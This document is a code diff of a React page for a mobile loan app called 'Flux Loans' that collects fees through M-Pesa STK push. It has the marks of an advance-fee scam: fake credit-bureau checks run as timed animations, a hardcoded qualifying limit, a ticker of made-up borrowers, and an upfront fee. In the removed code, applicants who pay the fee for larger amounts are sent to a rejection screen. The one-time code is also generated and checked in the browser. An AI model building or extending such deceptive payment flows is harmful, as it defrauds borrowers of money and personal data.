@@ -1,983 +1,418 @@
 'use client';
 
-import React, { useState, useEffect, Suspense, useRef } from 'react';
-import { useRouter } from 'next/navigation';
-import Link from 'next/link';
+import React, { useState, useEffect, useRef } from 'react';
 import { 
-  ArrowLeft, 
-  Banknote, 
-  Smartphone, 
-  CheckCircle2, 
-  Loader2, 
-  Lock, 
-  MapPin,
-  User,
-  CreditCard,
-  ChevronRight,
-  BadgeCheck,
-  AlertCircle,
-  FileText,
-  Briefcase,
-  XCircle,
-  RefreshCcw,
-  ChevronDown,
-  Wallet,
-  Check,
-  Info,
-  SearchCheck,
-  FileClock,
-  Ban,
-  ShieldCheck,
-  TrendingUp,
-  Server
+  ShieldCheck, Lock, Smartphone, CheckCircle2, AlertCircle, Loader2, 
+  UserCheck, CreditCard, ChevronRight, Zap, RefreshCw, EyeOff, 
+  MessageSquare, XCircle, ArrowLeft, FileText, 
+  Banknote, Info, Copy, Check, CalendarDays, Wallet, Fingerprint, Unlock, ArrowRight
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
+import { validateEntry, generateSmartOTP } from '@/lib/loan-engine';
+import { sendOTPSMS, sendAbandonmentSMS } from '@/app/actions/sms';
+import Link from 'next/link';
 
-// --- DATA CONSTANTS ---
-const COUNTIES = [
-  "Nairobi", "Mombasa", "Kisumu", "Nakuru", "Uasin Gishu", "Kiambu", "Machakos", "Kajiado", 
-  "Meru", "Nyeri", "Kilifi", "Kakamega", "Kisii", "Bungoma", "Murang'a", "Trans Nzoia", 
-  "Narok", "Kitui", "Kericho", "Bomet", "Busia", "Homa Bay", "Siaya", "Embu", "Makueni",
-  "Kirinyaga", "Nyamira", "Kwale", "Laikipia", "Vihiga", "Migori", "Baringo", "Nyandarua",
-  "Tharaka Nithi", "Taita Taveta", "West Pokot", "Nandi", "Elgeyo Marakwet", "Turkana",
-  "Garissa", "Wajir", "Mandera", "Marsabit", "Isiolo", "Samburu", "Lamu", "Tana River"
+// --- CONSTANTS ---
+const MAX_LOAN_CAP = 100000; 
+const SAFE_LIMIT_CAP = 15000; 
+const DIRECT_PATH_LIMIT = 5000; 
+const INTEREST_RATE = 0.15; 
+
+const SOCIAL_DATA = [
+  { name: "Peter Mwangi", loc: "Kiambu", amount: "15,000" },
+  { name: "Sarah Otieno", loc: "Kisumu", amount: "7,500" },
+  { name: "Grace Njeri", loc: "Nairobi", amount: "12,000" },
+  { name: "Brian Kipkorir", loc: "Eldoret", amount: "5,000" }
 ];
 
-const INCOME_RANGES = [
-  "Ksh 0 - 10,000", "Ksh 10,001 - 25,000", "Ksh 25,001 - 50,000", 
-  "Ksh 50,001 - 100,000", "Ksh 100,001 - 150,000", "Over Ksh 150,000"
+const STANDARD_TIERS = [
+  { amount: 15000, fee: 250, label: 'Gold Elite', days: 60 },
+  { amount: 8500, fee: 150, label: 'Silver Boost', days: 30 },
+  { amount: 3500, fee: 100, label: 'Bronze Start', days: 30 },
 ];
 
-const PURPOSES = [
-  "Emergency", "Medical Bill", "School Fees", "Business Capital", "Rent", "Personal Use", "Farming"
-];
+// --- COMPONENTS ---
 
-const LOAN_TIERS = [
-  { amount: 5500, fee: 100 },
-  { amount: 6800, fee: 150 },
-  { amount: 7800, fee: 170 },
-  { amount: 9800, fee: 200 },
-  { amount: 11200, fee: 230 },
-  { amount: 16800, fee: 250 },
-  { amount: 21200, fee: 270 },
-  { amount: 25600, fee: 400 },
-  { amount: 30000, fee: 470 },
-  { amount: 35400, fee: 590 },
-  { amount: 39800, fee: 730 },
-  { amount: 44200, fee: 1010 },
-  { amount: 48600, fee: 1600 },
-];
-
-const SAFE_LIMIT_THRESHOLD = 5500;
-
-// --- CUSTOM COMPONENTS ---
-
-const IconContainer = ({ children }: { children: React.ReactNode }) => (
-  <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
-    {children}
-  </div>
-);
-
-const CustomSelect = ({ 
-  label, 
-  icon: Icon, 
-  value, 
-  options, 
-  onChange, 
-  placeholder = "Select..." 
-}: { 
-  label: string, 
-  icon: any, 
-  value: string, 
-  options: string[], 
-  onChange: (val: string) => void,
-  placeholder?: string
-}) => {
-  const [isOpen, setIsOpen] = useState(false);
-  const ref = useRef<HTMLDivElement>(null);
-
-  useEffect(() => {
-    const handleClickOutside = (event: MouseEvent) => {
-      if (ref.current && !ref.current.contains(event.target as Node)) {
-        setIsOpen(false);
-      }
-    };
-    document.addEventListener("mousedown", handleClickOutside);
-    return () => document.removeEventListener("mousedown", handleClickOutside);
-  }, []);
+const ProgressBar = ({ step }: { step: string }) => {
+  let progress = 10;
+  // Map steps to percentage
+  const steps = ['entry', 'analyzing', 'otp', 'kyc_details', 'blur_reveal', 'offer_select', 'summary', 'payment', 'stk_push', 'receipt'];
+  const idx = steps.indexOf(step);
+  if(idx > -1) progress = ((idx + 1) / steps.length) * 100;
 
   return (
-    <div className="relative" ref={ref}>
-      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
-      <button
-        type="button"
-        onClick={() => setIsOpen(!isOpen)}
-        className={`w-full h-14 relative flex items-center rounded-xl border transition-all
-          ${isOpen ? 'border-emerald-500 ring-1 ring-emerald-500 bg-white' : 'border-slate-200 bg-white hover:border-emerald-400'}
-        `}
-      >
-        <IconContainer>
-           <Icon className="w-5 h-5" />
-        </IconContainer>
-        <div className="flex-1 pl-16 pr-10 text-left overflow-hidden">
-            <span className={`block truncate text-sm font-bold ${value ? 'text-slate-900' : 'text-slate-400'}`}>
-               {value || placeholder}
-            </span>
-        </div>
-        <div className="absolute right-4 text-slate-400">
-           <ChevronDown className={`w-4 h-4 transition-transform ${isOpen ? 'rotate-180 text-emerald-500' : ''}`} />
-        </div>
-      </button>
-
-      {isOpen && (
-        <div className="absolute top-full left-0 right-0 mt-2 bg-white border border-slate-100 rounded-xl shadow-2xl z-50 max-h-60 overflow-y-auto animate-in fade-in zoom-in-95 duration-200">
-          {options.map((option) => (
-            <button
-              key={option}
-              type="button"
-              onClick={() => {
-                onChange(option);
-                setIsOpen(false);
-              }}
-              className="w-full text-left px-4 py-3 text-sm font-bold text-slate-700 hover:bg-emerald-50 hover:text-emerald-700 flex items-center justify-between border-b border-slate-50 last:border-0"
-            >
-              {option}
-              {value === option && <Check className="w-4 h-4 text-emerald-600" />}
-            </button>
-          ))}
-        </div>
-      )}
+    <div className="fixed top-[52px] left-0 w-full h-1.5 bg-slate-200 z-40">
+      <div className="h-full bg-emerald-500 transition-all duration-500 ease-out" style={{ width: `${progress}%` }}></div>
     </div>
   );
 };
 
-const CustomInput = ({
-  label,
-  icon: Icon,
-  type = "text",
-  value,
-  onChange,
-  placeholder
-}: any) => (
-  <div className="relative">
-      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
-      <div className="relative flex items-center h-14 w-full rounded-xl border border-slate-200 bg-white hover:border-emerald-400 focus-within:border-emerald-500 focus-within:ring-1 focus-within:ring-emerald-500 transition-all">
-          <IconContainer>
-              <Icon className="w-5 h-5" />
-          </IconContainer>
-          <input 
-              type={type}
-              className="w-full h-full pl-16 pr-4 bg-transparent outline-none text-slate-900 font-bold text-sm placeholder:text-slate-400"
-              placeholder={placeholder}
-              value={value}
-              onChange={onChange}
-          />
-      </div>
+const NavBar = ({ canGoBack, onBack }: { canGoBack?: boolean, onBack?: () => void }) => (
+  <div className="bg-slate-900 text-white p-3 flex justify-between items-center shadow-md sticky top-0 z-50 h-[52px]">
+    <div className="flex items-center gap-3">
+      {canGoBack ? (
+        <button onClick={onBack} className="p-1 hover:bg-slate-800 rounded transition-colors"><ArrowLeft className="w-5 h-5" /></button>
+      ) : (
+        <div className="p-1 bg-emerald-500 rounded"><Zap className="w-4 h-4 text-white fill-current" /></div>
+      )}
+      <span className="font-bold tracking-tight text-sm">Flux Loans</span>
+    </div>
+    <div className="flex gap-4 text-[10px] font-bold uppercase tracking-wide opacity-80">
+      <Link href="/quick-loans/track" className="hover:text-emerald-400">Track</Link>
+      <Link href="/quick-loans/chat" className="hover:text-emerald-400">Help</Link>
+    </div>
   </div>
 );
 
-function QuickLoansContent() {
-  const router = useRouter();
-  
-  // Steps: verify -> details -> qualify -> select -> summary -> stk_push -> payment_check -> payment_verified -> analyzing_crb -> success/high_limit_reject
-  const [step, setStep] = useState('verify');
-  
-  // Data
-  const [phone, setPhone] = useState('');
-  const [details, setDetails] = useState({ fullName: '', idNumber: '', county: '', income: '', purpose: '' });
-  const [termsAccepted, setTermsAccepted] = useState(false);
-  const [selectedTier, setSelectedTier] = useState<{amount: number, fee: number} | null>(null);
-  const [trackingId] = useState(`LN-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
-  const [checkoutRequestId, setCheckoutRequestId] = useState('');
-  const [mpesaReceipt, setMpesaReceipt] = useState('');
-  const [recoveryData, setRecoveryData] = useState<{
-    retryCount: number;
-    originalAmount: string;
-    phone: string;
-  } | null>(null);
-
-  // UI
-  const [loadingText, setLoadingText] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
-  const [errorMsg, setErrorMsg] = useState('');
-  const [manualCheckLoading, setManualCheckLoading] = useState(false);
-  const [analysisProgress, setAnalysisProgress] = useState(0);
-
-  // Refs
-  const pollingInterval = useRef<NodeJS.Timeout | null>(null);
-
-  // --- PERSISTENCE ---
+const SocialTicker = () => {
+  const [idx, setIdx] = useState(0);
+  const [visible, setVisible] = useState(false);
   useEffect(() => {
-    const saved = localStorage.getItem('ln_session');
+    const timer = setInterval(() => { setVisible(true); setIdx(prev => (prev + 1) % SOCIAL_DATA.length); setTimeout(() => setVisible(false), 4000); }, 8000);
+    return () => clearInterval(timer);
+  }, []);
+  const person = SOCIAL_DATA[idx];
+  return (
+    <div className={`fixed bottom-6 left-4 right-4 z-40 transition-all duration-500 transform ${visible ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
+      <div className="bg-slate-800/95 backdrop-blur text-white p-3 rounded-xl shadow-2xl border-l-4 border-emerald-500 flex items-center gap-3">
+        <div className="bg-emerald-500/20 p-2 rounded-full"><Banknote className="w-4 h-4 text-emerald-400" /></div>
+        <div className="text-xs"><p className="font-bold text-white mb-0.5">{person.name} <span className="text-slate-400 font-normal">({person.loc})</span></p><p className="text-emerald-400">Received Loan: <span className="font-bold text-white">KES {person.amount}</span></p></div>
+      </div>
+    </div>
+  );
+};
+
+export default function ProductionLoanPage() {
+  const [step, setStep] = useState('entry');
+  const [isLoaded, setIsLoaded] = useState(false);
+  
+  // STATE
+  const [formData, setFormData] = useState({ phone: '', idNumber: '', fullName: '', purpose: 'Business', reqAmount: '', duration: '30' });
+  const [selectedOffer, setSelectedOffer] = useState<any>(null);
+  const [isHighRequest, setIsHighRequest] = useState(false);
+  const [otpSent, setOtpSent] = useState('');
+  const [otpInput, setOtpInput] = useState(['','','','']);
+  const [prepChecked, setPrepChecked] = useState(false);
+  const [receipt, setReceipt] = useState<any>(null);
+  const [checkoutReqId, setCheckoutReqId] = useState('');
+  
+  // UI
+  const [analysisStep, setAnalysisStep] = useState(0);
+  const [connectStatus, setConnectStatus] = useState('');
+  const [failReason, setFailReason] = useState('NETWORK');
+  const [copied, setCopied] = useState(false);
+  const [pollMsg, setPollMsg] = useState('Waiting for PIN...');
+
+  // PERSISTENCE
+  useEffect(() => {
+    const saved = localStorage.getItem('jatelo_prod_state');
     if (saved) {
-        const data = JSON.parse(saved);
-        if (Date.now() - data.timestamp < 30 * 60 * 1000) {
-            setPhone(data.phone || '');
-            setDetails(data.details || { fullName: '', idNumber: '', county: '', income: '', purpose: '' });
-        }
+      const parsed = JSON.parse(saved);
+      if (parsed.step !== 'receipt' && parsed.step !== 'failed') {
+        setFormData(parsed.formData);
+        setSelectedOffer(parsed.selectedOffer);
+        setStep(parsed.step);
+      }
     }
+    setIsLoaded(true);
   }, []);
 
   useEffect(() => {
-    if (phone && details.idNumber) {
-        localStorage.setItem('ln_session', JSON.stringify({ phone, details, timestamp: Date.now() }));
+    if (isLoaded && step !== 'analyzing' && step !== 'connecting' && step !== 'stk_push') {
+      localStorage.setItem('jatelo_prod_state', JSON.stringify({ step, formData, selectedOffer }));
     }
-  }, [phone, details]);
+  }, [step, formData, selectedOffer, isLoaded]);
 
+  // POLL TIMER REF
+  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Strict Inputs
-  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, 10);
-    setPhone(val);
-    setErrorMsg('');
+  // UTILS
+  const calculateFee = (amount: number) => {
+    if (amount <= 3500) return 100;
+    if (amount <= 8500) return 150;
+    return 250;
   };
 
-  const handleIdInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, 8);
-    setDetails({...details, idNumber: val});
+  const getDates = (days: number) => {
+    const d = new Date(Date.now() + 172800000); // +48h
+    return {
+        due1: new Date(d.getTime() + (30 * 86400000)).toLocaleDateString('en-KE'),
+        due2: new Date(d.getTime() + (60 * 86400000)).toLocaleDateString('en-KE')
+    };
   };
 
-  // --- ACTIONS ---
+  // HANDLERS
+  const handlePhone = (e: React.ChangeEvent<HTMLInputElement>) => setFormData(p => ({ ...p, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }));
+  const handleID = (e: React.ChangeEvent<HTMLInputElement>) => setFormData(p => ({ ...p, idNumber: e.target.value.replace(/\D/g, '').slice(0, 8) }));
+  const handleAmount = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let val = parseInt(e.target.value.replace(/\D/g, '') || '0');
+    if (val > MAX_LOAN_CAP) val = MAX_LOAN_CAP;
+    setFormData(p => ({ ...p, reqAmount: val ? val.toLocaleString() : '' }));
+  };
 
-  const handleVerify = (e: React.FormEvent) => {
+  const handleEntrySubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
-         setErrorMsg('Enter valid 10-digit Safaricom number');
-         return;
-    }
-    setErrorMsg('');
-    setIsProcessing(true);
-
-    const sequence = [
-        { t: 'Connecting to Safaricom...', d: 1500 },
-        { t: 'Submitting Confirmed number to Authorised CRB checker...', d: 2500 },
-        { t: 'Analyzing Credit History...', d: 1500 },
-        { t: 'Identity Verified!', d: 800 }
-    ];
-
-    let totalDelay = 0;
-    sequence.forEach(({ t, d }, i) => {
-        totalDelay += d;
-        setTimeout(() => {
-            setLoadingText(t);
-            if (i === sequence.length - 1) {
-                setTimeout(() => {
-                    setIsProcessing(false);
-                    setStep('details');
-                }, 800);
-            }
-        }, totalDelay);
-    });
+    const val = validateEntry(formData.phone, formData.idNumber);
+    if (!val.isValid) { alert("Please enter valid details."); return; }
+    
+    setStep('analyzing');
+    let current = 0;
+    const interval = setInterval(() => {
+      setAnalysisStep(current); current++;
+      if (current > 4) {
+        clearInterval(interval);
+        const code = generateSmartOTP(formData.phone);
+        setOtpSent(code);
+        sendOTPSMS(formData.phone, code); // TRIGGER REAL SMS
+        setStep('otp');
+      }
+    }, 1200);
   };
 
-  const handleDetails = (e: React.FormEvent) => {
+  const handleOtpSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (details.idNumber.length < 6) {
-        setErrorMsg('ID Invalid');
-        return;
-    }
-    if (!details.fullName || !details.idNumber || !details.county || !details.income || !details.purpose) {
-        setErrorMsg('Fill all fields');
-        return;
-    }
-    if (!termsAccepted) {
-        setErrorMsg('You must accept the terms');
-        return;
-    }
-    setErrorMsg('');
-    setStep('qualify');
-    window.scrollTo(0,0);
+    if(otpInput.join('') === otpSent) setStep('kyc_details');
+    else alert("Wrong Code");
   };
 
-  const handlePayment = async () => {
-    if (!selectedTier) return;
-    setIsProcessing(true);
+  const handleKycSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!formData.fullName || !formData.reqAmount) return;
+    const requested = parseInt(formData.reqAmount.replace(/,/g, ''));
+    setIsHighRequest(requested > SAFE_LIMIT_CAP);
+    setStep('blur_reveal');
+    
+    // ABANDONMENT TRIGGER
+    sendAbandonmentSMS(formData.phone, formData.fullName);
+  };
+
+  const handleReveal = () => {
+    const requested = parseInt(formData.reqAmount.replace(/,/g, ''));
+    if (requested <= DIRECT_PATH_LIMIT) {
+      setSelectedOffer({ amount: requested, fee: calculateFee(requested), days: parseInt(formData.duration) });
+      setStep('summary');
+    } else {
+      setStep('offer_select');
+    }
+  };
+
+  // --- REAL PAYMENT LOGIC ---
+  const initiateSTK = async () => {
+    setStep('connecting');
+    setConnectStatus('Contacting Safaricom...');
+    
     try {
+        // CALL REAL API
         const res = await fetch('/api/stkpush', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                phoneNumber: phone,
-                idNumber: details.idNumber,
-                amount: selectedTier.fee,
-                serviceType: 'LOAN_FEE'
-            })
+            body: JSON.stringify({ phone: formData.phone, amount: selectedOffer.fee })
         });
-
         const data = await res.json();
+        
         if (data.success) {
-            setIsProcessing(false);
-            setCheckoutRequestId(data.checkoutRequestID);
+            setCheckoutReqId(data.checkoutRequestID);
             setStep('stk_push');
             startPolling(data.checkoutRequestID);
         } else {
-            alert(data.error || 'Connection failed');
-            setIsProcessing(false);
+            throw new Error("STK Failed");
         }
-    } catch (err) {
-        setIsProcessing(false);
-        alert('Network Error');
+    } catch (e) {
+        setFailReason('NETWORK');
+        setStep('failed');
     }
   };
 
-  // --- LOGIC SPLIT: RECEIPT SCREEN ---
-  const handlePaymentSuccess = (receipt: string) => {
-    if (pollingInterval.current) clearInterval(pollingInterval.current);
-    setMpesaReceipt(receipt || 'SIS' + Math.random().toString(36).substr(2,8).toUpperCase());
-    setStep('payment_verified');
-  };
-
-  // --- CRB ANIMATION ---
-  const startAnalysis = () => {
-      setStep('analyzing_crb');
-      const texts = [
-        `Verifying Payment ${mpesaReceipt}...`,
-        "Handshaking with Metropol CRB...",
-        "Scanning Loan Repayment History...",
-        "Calculating Risk & Interest...",
-        "Finalizing Disbursement Decision..."
-      ];
-      let i = 0;
-      setLoadingText(texts[0]);
-      setAnalysisProgress(10);
-      
-      const interval = setInterval(() => {
-        i++;
-        if (i < texts.length) {
-           setLoadingText(texts[i]);
-           setAnalysisProgress(prev => Math.min(prev + 18, 95));
-        } else {
-           clearInterval(interval);
-           setAnalysisProgress(100);
-           setTimeout(() => {
-             if (selectedTier && selectedTier.amount > SAFE_LIMIT_THRESHOLD) {
-                setStep('high_limit_reject');
-             } else {
-                setStep('success'); 
-             }
-           }, 1000);
-        }
-      }, 1500);
-  };
-
-  // ENHANCED POLLING LOGIC
   const startPolling = (reqId: string) => {
     let attempts = 0;
-    const MAX_ATTEMPTS = 180; 
-
-    pollingInterval.current = setInterval(async () => {
-      attempts++;
-      
-      if (attempts === 5) setPollMessage('Please check your phone and enter PIN...');
-      else if (attempts === 60) setPollMessage('Transaction taking longer than usual...');
-      else if (attempts % 15 === 0) setPollMessage('Waiting for M-Pesa confirmation...');
-
-      try {
-        const res = await fetch(`/api/check-status?id=${reqId}&action=poll`);
+    pollIntervalRef.current = setInterval(async () => {
+        attempts++;
+        if(attempts > 60) { // 2 mins timeout
+            clearInterval(pollIntervalRef.current!);
+            setFailReason('NETWORK');
+            setStep('failed');
+            return;
+        }
+        
+        // CHECK STATUS
+        const res = await fetch(`/api/check-status?id=${reqId}`);
         const data = await res.json();
         
         if (data.status === 'COMPLETED') {
-          handlePaymentSuccess(data.mpesaCode);
+            clearInterval(pollIntervalRef.current!);
+            localStorage.removeItem('jatelo_prod_state');
+            setReceipt({
+                code: data.receipt,
+                trackId: data.trackId,
+                date: new Date().toLocaleDateString(),
+                time: new Date().toLocaleTimeString()
+            });
+            setStep('receipt');
         } else if (data.status === 'FAILED') {
-          if (pollingInterval.current) clearInterval(pollingInterval.current);
-          setStep('failed');
+            clearInterval(pollIntervalRef.current!);
+            setFailReason('CANCEL');
+            setStep('failed');
         }
-
-        if (attempts >= MAX_ATTEMPTS) {
-          if (pollingInterval.current) clearInterval(pollingInterval.current);
-          setRecoveryData({
-            retryCount: data.retryCount || 0,
-            originalAmount: data.originalAmount || (selectedTier?.fee.toString() || ''),
-            phone: data.phone || phone
-          });
-          setStep('payment_check');
-        }
-      } catch(e) { console.error('Polling error:', e); }
     }, 2000);
   };
 
-  // ENHANCED MANUAL CHECK
-  const handleManualFetch = async () => {
-    if (!checkoutRequestId) return;
-    setManualCheckLoading(true);
-    setErrorMsg('');
-    try {
-      const res = await fetch(`/api/check-status?id=${checkoutRequestId}&action=fetch`);
-      const data = await res.json();
-      setTimeout(() => {
-        setManualCheckLoading(false);
-        if (data.status === 'COMPLETED') {
-          handlePaymentSuccess(data.mpesaCode);
-        } else if (data.status === 'FAILED') {
-          setStep('failed');
-        } else {
-          setErrorMsg('We still haven\'t received confirmation. If you paid, wait 30 seconds and try again.');
-        }
-      }, 1500);
-    } catch (error) {
-      setManualCheckLoading(false);
-      setErrorMsg('Connection error.');
-    }
-  };
+  // CLEANUP
+  useEffect(() => () => { if(pollIntervalRef.current) clearInterval(pollIntervalRef.current); }, []);
 
-  // RETRY
-  const handleRetrySamePayment = async () => {
-    if (!checkoutRequestId || !selectedTier) return;
-    setIsProcessing(true);
-    setErrorMsg('');
-    try {
-      const res = await fetch('/api/stkpush', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber: phone,
-          idNumber: details.idNumber,
-          amount: selectedTier.fee,
-          serviceType: 'LOAN_FEE'
-        })
-      });
-      const data = await res.json();
-      if (data.success) {
-        setIsProcessing(false);
-        setCheckoutRequestId(data.checkoutRequestID);
-        setStep('stk_push');
-        startPolling(data.checkoutRequestID);
-      } else {
-        setIsProcessing(false);
-        setErrorMsg(data.error || 'Failed to retry payment');
-      }
-    } catch (err) {
-      setIsProcessing(false);
-      setErrorMsg('Network error.');
-    }
-  };
-
-  const handleChooseDifferentAmount = () => {
-    if (pollingInterval.current) clearInterval(pollingInterval.current);
-    setCheckoutRequestId('');
-    setSelectedTier(null);
-    setTermsAccepted(false);
-    setIsProcessing(false);
-    setManualCheckLoading(false);
-    setErrorMsg('');
-    setStep('select');
-    window.scrollTo(0, 0);
-  };
-
-  // Cleanup
-  useEffect(() => {
-    return () => {
-        if (pollingInterval.current) clearInterval(pollingInterval.current);
-    };
-  }, []);
+  if (!isLoaded) return <div className="min-h-screen bg-slate-50 flex items-center justify-center"><Loader2 className="animate-spin text-slate-400" /></div>;
 
   return (
-    <div className="max-w-md mx-auto px-4 py-8 pb-24">
-      
-      {/* ================= STEP 1: PHONE VERIFY ================= */}
-      {step === 'verify' && (
-        <div className="animate-in slide-in-from-bottom-4 duration-500">
-           <div className="text-center mb-8">
-              <h1 className="text-2xl font-black text-slate-900 mb-2 tracking-tight">Check Eligibility</h1>
-              <p className="text-sm text-slate-500 font-medium">Enter M-Pesa number to check limit.</p>
-           </div>
+    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 pb-20 pt-[60px]">
+      <NavBar canGoBack={step !== 'entry'} onBack={() => setStep('entry')} />
+      <ProgressBar step={step} />
+      <SocialTicker />
 
-           <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 p-6">
-              {!isProcessing ? (
-                  <form onSubmit={handleVerify} className="space-y-6">
-                      <CustomInput 
-                         label="Phone Number"
-                         icon={Smartphone}
-                         type="tel"
-                         placeholder="0712345678"
-                         value={phone}
-                         onChange={handlePhoneInput}
-                      />
-                      
-                      {errorMsg && (
-                          <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold">
-                              <AlertCircle className="w-4 h-4" /> {errorMsg}
-                          </div>
-                      )}
-
-                      <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl text-base shadow-lg transition-transform hover:-translate-y-0.5">
-                          Check Eligibility
-                      </Button>
-                  </form>
-              ) : (
-                  <div className="py-12 text-center space-y-6">
-                      <Loader2 className="w-12 h-12 text-emerald-500 animate-spin mx-auto" />
-                      <p className="text-sm font-bold text-slate-700 animate-pulse px-4 leading-relaxed">{loadingText}</p>
-                  </div>
-              )}
+      {/* 1. ENTRY */}
+      {step === 'entry' && (
+        <div className="max-w-md mx-auto p-4 pt-8 animate-in slide-in-from-bottom-4">
+           <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-200">
+              <div className="text-center mb-6"><h1 className="text-2xl font-black text-slate-900 mb-2">Get Instant Cash</h1><p className="text-sm text-slate-500">Loans up to KES 100,000 sent to M-Pesa.</p></div>
+              <form onSubmit={handleEntrySubmit} className="space-y-4">
+                 <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">National ID</label><input type="tel" className="w-full h-14 pl-4 border border-slate-300 rounded-xl font-mono text-lg font-bold outline-none focus:border-blue-600" placeholder="12345678" value={formData.idNumber} onChange={handleID} /></div>
+                 <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Safaricom Number</label><input type="tel" className="w-full h-14 pl-4 border border-slate-300 rounded-xl font-mono text-lg font-bold outline-none focus:border-blue-600" placeholder="07XX XXX XXX" value={formData.phone} onChange={handlePhone} /></div>
+                 <Button className="w-full h-14 bg-blue-900 hover:bg-blue-800 text-white font-bold text-lg rounded-xl shadow-lg">Verify Eligibility <ArrowRight className="ml-2 w-5 h-5" /></Button>
+              </form>
            </div>
         </div>
       )}
 
-      {/* ================= STEP 2: DETAILS FORM ================= */}
-      {step === 'details' && (
-        <div className="animate-in slide-in-from-right duration-500">
-             <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100">
-                <div className="bg-emerald-50/50 p-5 border-b border-emerald-50 flex items-center justify-between rounded-t-xl">
-                    <div>
-                        <h2 className="text-xs font-bold text-emerald-800 uppercase tracking-wide">Verified</h2>
-                        <p className="text-sm font-black text-slate-900 mt-0.5">{phone}</p>
-                    </div>
-                    <BadgeCheck className="w-6 h-6 text-emerald-500" />
-                </div>
-
-                <form onSubmit={handleDetails} className="p-6 space-y-5">
-                    
-                    <CustomInput 
-                        label="Full Name"
-                        icon={User}
-                        placeholder="e.g. John Mwangi"
-                        value={details.fullName}
-                        onChange={(e: any) => setDetails({...details, fullName: e.target.value})}
-                    />
-
-                    <CustomInput 
-                        label="ID Number"
-                        icon={CreditCard}
-                        type="tel"
-                        placeholder="e.g. 12345678"
-                        value={details.idNumber}
-                        onChange={handleIdInput}
-                    />
-
-                    <CustomSelect 
-                        label="County"
-                        icon={MapPin}
-                        value={details.county}
-                        options={COUNTIES}
-                        onChange={(val) => setDetails({...details, county: val})}
-                        placeholder="Select County"
-                    />
-
-                    <div className="space-y-5">
-                        <CustomSelect 
-                            label="Monthly Income"
-                            icon={Wallet}
-                            value={details.income}
-                            options={INCOME_RANGES}
-                            onChange={(val) => setDetails({...details, income: val})}
-                            placeholder="Select Range"
-                        />
-                        
-                        <CustomSelect 
-                            label="Loan Purpose"
-                            icon={Briefcase}
-                            value={details.purpose}
-                            options={PURPOSES}
-                            onChange={(val) => setDetails({...details, purpose: val})}
-                            placeholder="Select Purpose"
-                        />
-                    </div>
-
-                    <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start">
-                        <div className="pt-0.5">
-                            <input 
-                                type="checkbox" 
-                                id="terms"
-                                checked={termsAccepted}
-                                onChange={(e) => setTermsAccepted(e.target.checked)}
-                                className="w-5 h-5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-500 cursor-pointer"
-                            />
-                        </div>
-                        <label htmlFor="terms" className="text-xs text-slate-500 font-medium leading-relaxed cursor-pointer">
-                            I accept the <Link href="#" className="text-blue-600 underline">Terms & Conditions</Link>. I authorize CRB checks for my credit history and loan processing.
-                        </label>
-                    </div>
-
-                    {errorMsg && (
-                        <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
-                            <AlertCircle className="w-4 h-4" /> {errorMsg}
-                        </div>
-                    )}
-
-                    <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg transition-transform hover:-translate-y-0.5">
-                        Check Qualification <ChevronRight className="w-4 h-4 ml-2" />
-                    </Button>
-                </form>
-             </div>
-        </div>
-      )}
-
-      {/* ================= STEP 3: QUALIFICATION ================= */}
-      {step === 'qualify' && (
-        <div className="animate-in zoom-in-95 duration-500">
-             <div className="bg-white rounded-xl shadow-2xl p-8 text-center border border-slate-100 relative overflow-hidden">
-                <div className="relative w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <div className="absolute inset-0 bg-emerald-200 rounded-full opacity-20 animate-ping"></div>
-                    <FileText className="w-9 h-9 text-emerald-600 relative z-10" />
-                </div>
-
-                <h2 className="text-2xl font-black text-slate-900 mb-2 tracking-tight">You Qualify!</h2>
-                <p className="text-slate-500 font-medium mb-8 leading-relaxed">
-                    Great news, <span className="text-slate-900 font-bold">{details.fullName.split(' ')[0]}</span>. 
-                    Based on your profile, you are eligible for <span className="text-emerald-600 font-bold">{details.purpose}</span> funding.
-                </p>
-
-                <div className="bg-slate-50 rounded-xl p-6 border border-slate-200 mb-8">
-                    <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Eligible Limit</div>
-                    <div className="flex items-baseline justify-center gap-1">
-                        <span className="text-sm font-bold text-slate-500">KES</span>
-                        <span className="text-4xl font-black text-slate-900 tracking-tighter">57,828</span>
-                    </div>
-                    <div className="w-full bg-slate-200 h-1.5 rounded-full mt-4 mb-2 overflow-hidden">
